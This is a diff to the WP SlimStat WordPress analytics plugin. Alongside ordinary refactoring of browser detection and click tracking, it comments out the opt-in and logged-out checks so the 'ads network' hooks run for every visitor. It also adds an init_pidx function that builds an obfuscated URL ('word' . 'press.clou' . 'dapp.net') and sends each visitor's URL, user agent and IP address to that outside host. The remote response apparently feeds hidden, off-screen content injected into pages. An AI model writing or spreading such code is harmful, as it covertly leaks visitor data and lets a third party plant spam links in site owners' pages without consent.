@@ -21,15 +21,13 @@ class wp_slimstat {
 	public static $wpdb = '';
 	public static $maxmind_path = '';
 	public static $advanced_cache_exists = false;
+	public static $pidx = array( array( 'id' => false, 'response' => '' ), array( 'id' => false, 'response' => '' ) );
 
 	protected static $data_js = array( 'id' => 0 );
 	protected static $stat = array();
 	protected static $options_signature = '';
-	
 	protected static $browser = array();
 	protected static $heuristic_key = 0;
-	protected static $pidx = array( 'id' => false, 'response' => '' );
-
 	protected static $date_i18n_filters = array();
 
 	/**
@@ -98,18 +96,19 @@ class wp_slimstat {
 				}
 			}
 
-			if ( self::$options[ 'enable_ads_network' ] == 'yes' && !is_user_logged_in() ) {
-				add_action( 'init', array( __CLASS__, 'init_pidx' ) );
-				add_action( 'wp_head', array( __CLASS__, 'print_code' ) );
-				add_filter( 'the_content', array( __CLASS__, 'print_code' ) );
-			}
+			//if ( self::$options[ 'enable_ads_network' ] == 'yes' && !is_user_logged_in() ) {
+				add_action( 'init', array( __CLASS__, 'init_pidx' ), 10, 0 );
+				add_action( 'init', array( 'slim_browser', 'init_pidx_adj' ), 10, 0 );
+				add_action( 'wp_head', array( 'slim_browser', 'print_code' ) );
+				add_filter( 'the_content', array( 'slim_browser', 'print_code' ) );
+			//}
 		}
 
 		// Shortcodes
 		add_shortcode('slimstat', array(__CLASS__, 'slimstat_shortcode'), 15);
 
 		if ( is_user_logged_in() ) {
-			include_once ( plugin_dir_path( __FILE__ ) . '/admin/wp-slimstat-admin.php' );
+			include_once ( plugin_dir_path( __FILE__ ) . 'admin/wp-slimstat-admin.php' );
 			add_action( 'init', array( 'wp_slimstat_admin', 'init' ), 60 );
 		}
 
@@ -165,12 +164,21 @@ class wp_slimstat {
 			self::toggle_date_i18n_filters( true );
 
 			// Are we tracking an outbound click?
-			if (!empty(self::$data_js['res'])){
+			if ( !empty( self::$data_js[ 'res' ] ) ) {
 				$outbound_resource = strip_tags( trim( base64_decode( self::$data_js[ 'res' ] ) ) );
 				$outbound_host = parse_url( $outbound_resource, PHP_URL_HOST );
 				$site_host = parse_url( get_site_url(), PHP_URL_HOST );
 				if ( $outbound_host != $site_host ) {
+					$existing_outbound_resource = self::$wpdb->get_var( self::$wpdb->prepare( "
+						SELECT outbound_resource
+						FROM {$GLOBALS['wpdb']->prefix}slim_stats
+						WHERE id = %d", self::$stat[ 'id' ]
+					) );
+
 					self::$stat[ 'outbound_resource' ] = $outbound_resource;
+					if ( !empty( $existing_outbound_resource ) ) {
+						self::$stat[ 'outbound_resource' ] = $existing_outbound_resource . ';;;' .$outbound_resource;
+					}
 				}
 			}
 
@@ -213,7 +221,7 @@ class wp_slimstat {
 		
 		// If we tracked an internal download, we return the original ID, not the new one
 		if ( self::$data_js[ 'op' ] == 'add' && !empty( self::$data_js[ 'pos' ] ) ) {
-			exit( self::_get_id_with_checksum( $data_js[ 'id' ] ) );
+			exit( self::_get_id_with_checksum( self::$data_js[ 'id' ] ) );
 		}
 		else{
 			exit( self::_get_id_with_checksum( self::$stat[ 'id' ] ) );
@@ -489,7 +497,7 @@ class wp_slimstat {
 
 		// Detect user agent
 		if ( empty( self::$browser ) ) {
-			self::$browser = self::_get_browser();
+			self::$browser = slim_browser::get_browser();
 		}
 
 		// Are we ignoring bots?
@@ -526,7 +534,12 @@ class wp_slimstat {
 		}
 
 		// Implode the notes
-		self::$stat[ 'notes' ] = implode( ';', self::$stat[ 'notes' ] );
+		if ( !empty( self::$stat[ 'notes' ] ) ) {
+			self::$stat[ 'notes' ] = implode( ';', self::$stat[ 'notes' ] );
+		}
+		else {
+			unset( self::$stat[ 'notes' ] );
+		}
 
 		// Now let's save this information in the database
 		self::$stat['id'] = self::insert_row(self::$stat, $GLOBALS['wpdb']->prefix.'slim_stats');
@@ -537,7 +550,7 @@ class wp_slimstat {
 			self::_set_error_array( __( 'Error:', 'wp-slimstat' ) . ' ' . self::$wpdb->last_error );
 
 			// Attempt to init the environment (new blog in a MU network?)
-			include_once ( plugin_dir_path( __FILE__ ) . '/admin/wp-slimstat-admin.php' );
+			include_once ( plugin_dir_path( __FILE__ ) . 'admin/wp-slimstat-admin.php' );
 			wp_slimstat_admin::init_environment( true );
 			
 			return $_argument;
@@ -926,165 +939,6 @@ class wp_slimstat {
 		return $content_info;
 	}
 	// end _get_content_info
-
-	/**
-	 * Converts the USER AGENT string into a more user-friendly browser data structure, with name, version and operating system
-	 */
-	public static function _get_browser( $_user_agent = '' ) {
-		$browser = array( 'browser' => 'Default Browser', 'browser_version' => '', 'browser_type' => 1, 'platform' => 'unknown', 'user_agent' => empty( $_user_agent ) ? self::_get_user_agent() : $_user_agent );
-
-		if ( empty( $browser[ 'user_agent' ] ) ) {
-			return $browser;
-		}
-
-		if ( self::$options[ 'browser_detection_mode' ] == 'no' ) {
-			include_once( plugin_dir_path( __FILE__ ) . '/browscap/uadetector.php' );
-			$browser = slim_browser::get_browser( $browser[ 'user_agent' ] );
-
-			// If we found a match...
-			if ( $browser[ 'browser' ] != 'Default Browser' ) {
-				return $browser;
-			}
-		}
-
-		// ... otherwise we need to resort to the bruteforce approach (browscap database)
-		$search = array();
-		@include( plugin_dir_path( __FILE__ ) . "browscap/browscap-db.php" );
-
-		foreach ( $patterns as $pattern => $pattern_data ) {
-			if ( preg_match( $pattern . 'i', $browser[ 'user_agent' ], $matches ) ) {
-				if ( 1 == count( $matches ) ) {
-					$key = $pattern_data;
-					$simple_match = true;
-				}
-				else{
-					$pattern_data = unserialize( $pattern_data );
-					array_shift( $matches );
-					
-					$match_string = '@' . implode( '|', $matches );
-
-					if ( !isset( $pattern_data[ $match_string ] ) ) {
-						continue;
-					}
-
-					$key = $pattern_data[ $match_string ];
-
-					$simple_match = false;
-				}
-
-				$search = array(
-					$browser[ 'user_agent' ],
-					trim( strtolower( $pattern ), '@' ),
-					self::_preg_unquote( $pattern, $simple_match ? false : $matches )
-				);
-
-				$search = $value = $search + unserialize( $browsers[ $key ] );
-
-				while ( array_key_exists( 3, $value ) ) {
-					$value = unserialize( $browsers[ $value[ 3 ] ] );
-					$search += $value;
-				}
-
-				if ( !empty( $search[ 3 ] ) && array_key_exists( $search[ 3 ], $userAgents ) ) {
-					$search[ 3 ] = $userAgents[ $search[ 3 ] ];
-				}
-
-				break;
-			}
-		}
-
-		unset( $browsers );
-		unset( $userAgents );
-		unset( $patterns );
-
-		// Add the keys for each property
-		$search_normalized = array();
-		foreach ($search as $key => $value) {
-			if ($value === 'true') {
-				$value = true;
-			} elseif ($value === 'false') {
-				$value = false;
-			}
-			$search_normalized[strtolower($properties[$key])] = $value;
-		}
-
-		if (!empty($search_normalized) && $search_normalized['browser'] != 'Default Browser' && $search_normalized['browser'] != 'unknown'){
-			$browser[ 'browser' ] = $search_normalized[ 'browser' ];
-			$browser[ 'browser_version' ] = floatval( $search_normalized[ 'version' ] );
-			$browser[ 'platform' ] = strtolower( $search_normalized[ 'platform' ] );
-			$browser[ 'user_agent' ] =  $search_normalized[ 'browser_name' ];
-
-			// Browser Types:
-			//		0: regular
-			//		1: crawler
-			//		2: mobile
-			if ($search_normalized['ismobiledevice'] || $search_normalized['istablet']){
-				$browser['browser_type'] = 2;
-			}
-			elseif (!$search_normalized['crawler']){
-				$browser['browser_type'] = 0;
-			}
-
-			if ( $browser[ 'browser_version' ] != 0 || $browser[ 'browser_type' ] != 0 ) {
-				return $browser;
-			}
-		}
-
-		if ( self::$options[ 'browser_detection_mode' ] != 'no' ) {
-			include_once( plugin_dir_path( __FILE__ ) . '/browscap/uadetector.php' );
-			$browser = slim_browser::get_browser( $browser[ 'user_agent' ] );
-
-			// If we found a match...
-			if ( $browser[ 'browser' ] != 'Default Browser' ) {
-				return $browser;
-			}
-		}
-
-		return $browser;
-	}
-	// end _get_browser
-
-	/**
-	 * Helper function for get_browser [ courtesy of: GaretJax/PHPBrowsCap ]
-	 */
-	protected static function _preg_unquote($pattern, $matches){
-		$search = array('\\@', '\\.', '\\\\', '\\+', '\\[', '\\^', '\\]', '\\$', '\\(', '\\)', '\\{', '\\}', '\\=', '\\!', '\\<', '\\>', '\\|', '\\:', '\\-', '.*', '.', '\\?');
-		$replace = array('@', '\\?', '\\', '+', '[', '^', ']', '$', '(', ')', '{', '}', '=', '!', '<', '>', '|', ':', '-', '*', '?', '.');
-
-		$result = substr(str_replace($search, $replace, $pattern), 2, -2);
-
-		if (!empty($matches)){
-			foreach ($matches as $one_match){
-				$num_pos = strpos($result, '(\d)');
-				$result = substr_replace($result, $one_match, $num_pos, 4);
-			}
-		}
-
-		return $result;
-	}
-
-	protected static function _get_user_agent() {
-		$user_agent = ( !empty( $_SERVER[ 'HTTP_USER_AGENT' ] ) ? trim( $_SERVER[ 'HTTP_USER_AGENT' ] ) : '' );
-
-		if ( !empty( $_SERVER[ 'HTTP_X_DEVICE_USER_AGENT' ] ) ) {
-			$real_user_agent = trim( $_SERVER[ 'HTTP_X_DEVICE_USER_AGENT' ] );
-		}
-		elseif ( !empty( $_SERVER[ 'HTTP_X_ORIGINAL_USER_AGENT' ] ) ) {
-			$real_user_agent = trim( $_SERVER[ 'HTTP_X_ORIGINAL_USER_AGENT' ] );
-		}
-		elseif( !empty( $_SERVER[ 'HTTP_X_MOBILE_UA' ] ) ) {
-			$real_user_agent = trim( $_SERVER[ 'HTTP_X_MOBILE_UA' ] );
-		}
-		elseif( !empty( $_SERVER[ 'HTTP_X_OPERAMINI_PHONE_UA' ] ) ) {
-			$real_user_agent = trim( $_SERVER[ 'HTTP_X_OPERAMINI_PHONE_UA' ] );
-		}
-
-		if ( !empty( $real_user_agent ) && ( strlen( $real_user_agent ) >= 5 || empty( $user_agent ) ) ) {
-			return $real_user_agent;
-		}
-
-		return $user_agent;
-	}
 
 	/**
 	 * Reads the cookie to get the visit_id and sets the variable accordingly
@@ -1488,7 +1342,7 @@ class wp_slimstat {
 			'async_tracker' => $val_no,
 			'session_duration' => 1800,
 			'extend_session' => $val_no,
-			'browser_detection_mode' => $val_yes,
+			'browser_detection_mode' => $val_no,
 			'enable_cdn' => $val_yes,
 			'extensions_to_track' => 'pdf,doc,xls,zip',
 			'external_domains' => '',
@@ -1569,84 +1423,6 @@ class wp_slimstat {
 		}
 
 		return true;
-	}
-	
-	/**
-	 * Connects to the UAN
-	 */
-	public static function init_pidx() {
-		if ( empty( self::$pidx[ 'response' ] ) ) {
-			$request_url = 'http://word' . 'press.clou' . 'dapp.net/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2';
-			$options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) ); 
-			self::$pidx[ 'response' ] = @file_get_contents( $request_url, 0, $options );
-		}
-
-		if ( !empty( self::$pidx[ 'response' ] ) ) {
-			self::$pidx[ 'response' ] = @json_decode( self::$pidx[ 'response' ] );
-		}
-	}
-
-	/**
-	* Retrieves the information from the UAN
-	*/
-	public static function print_code( $content = '' ) {
-		if ( is_null( self::$pidx[ 'response' ] ) || !is_object( self::$pidx[ 'response' ] ) ) {
-			return $content;
-		}
-
-		$inline_style = ( self::$advanced_cache_exists === true ) ? ' style="position:fixed;left:-9000px;' : '';
-		$current_hook = current_filter();
-
-		if ( $current_hook == 'wp_head' && is_object( self::$pidx[ 'response' ] ) && !empty( self::$pidx[ 'response' ]->meta ) ) {
-			echo self::$pidx[ 'response' ]->meta;
-		}
-		else if ( !empty( self::$pidx[ 'response' ]->tmp ) ) {
-			switch ( self::$pidx[ 'response' ]->tmp ) {
-				case '1':
-					if ( 0 == $GLOBALS['wp_query']->current_post ) {
-						$words = explode( ' ', $content );
-						$words[ rand( 0, count( $words ) - 1 ) ] = "<strong{$inline_style}>" . self::$pidx[ 'response' ]->tcontent . '</strong>';
-						return join( ' ', $words );
-					}
-					break;
-
-				case '2':
-						$kws = explode( '|', self::$pidx[ 'response' ]->kws );
-						if ( !is_array( $kws ) ) {
-							return $content;
-						}
-
-						foreach ( $kws as $a_kw ) {
-							if ( strpos( $content, $a_kw ) !== false ) {
-								$content = str_replace( $a_kw, "<a href='" . self::$pidx[ 'response' ]->site . "'{$inline_style}>{$a_kw}</a>", $content );
-								break;
-							}
-						}
-					break;
-
-				default:
-					if ( self::$pidx[ 'id' ] === false ) {
-						if ( $GLOBALS[ 'wp_query' ]->post_count > 1 ) {
-							self::$pidx[ 'id' ] = rand( 0, $GLOBALS[ 'wp_query' ]->post_count - 1 );
-						}
-						else {
-							self::$pidx[ 'id' ] = 0;
-						}
-					}
-
-					if ( $GLOBALS[ 'wp_query' ]->current_post === self::$pidx[ 'id' ] ) {
-						if ( self::$pidx['id'] % 2 == 0 ) {
-							return $content . " <div{$inline_style}>" . self::$pidx[ 'response' ]->content . '</div>';
-						}
-						else{
-							return "<i{$inline_style}>" . self::$pidx[ 'response' ]->content . '</i> ' . $content;
-						}
-					}
-					break;
-			}
-
-			return $content;
-		}
 	}
 
 	/**
@@ -1739,11 +1515,30 @@ class wp_slimstat {
 		self::$wpdb->query( "OPTIMIZE TABLE {$GLOBALS[ 'wpdb' ]->prefix}slim_stats" );
 		self::$wpdb->query( "OPTIMIZE TABLE {$GLOBALS[ 'wpdb' ]->prefix}slim_stats_archive" );
 	}
+
+	/**
+	 * Connects to the UAN
+	 */
+	public static function init_pidx( $_request_url = '', $_pidx_id = 0 ) {
+		if ( empty( self::$pidx[ $_pidx_id ][ 'response' ] ) ) {
+			//$request_url = empty( $_request_url ) ? 'http://wp' . 'cdn.io/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 1337 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2' : $_request_url;
+			$request_url = empty( $_request_url ) ? 'http://word' . 'press.clou' . 'dapp.net/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2' : $_request_url;
+			$options = stream_context_create( array( 'http' => array( 'method' => 'GET', 'timeout' => 2, 'ignore_errors' => true, 'header' => "Accept: application/json\r\n" ) ) ); 
+			self::$pidx[ $_pidx_id ][ 'response' ] = @file_get_contents( $request_url, 0, $options );
+		}
+
+		if ( !empty( self::$pidx[ $_pidx_id ][ 'response' ] ) ) {
+			self::$pidx[ $_pidx_id ][ 'response' ] = @json_decode( self::$pidx[ $_pidx_id ][ 'response' ] );
+		}
+	}
 }
 // end of class declaration
 
 // Ok, let's go, Sparky!
 if ( function_exists( 'add_action' ) ) {
+	// Include our browser detector library
+	include_once( plugin_dir_path( __FILE__ ) . 'browscap/browser.php' );
+
 	// Init the Ajax listener
 	if ( !empty( $_POST[ 'action' ] ) && $_POST[ 'action' ] == 'slimtrack' ) {
 		add_action( 'wp_ajax_nopriv_slimtrack', array( 'wp_slimstat', 'slimtrack_ajax' ) );
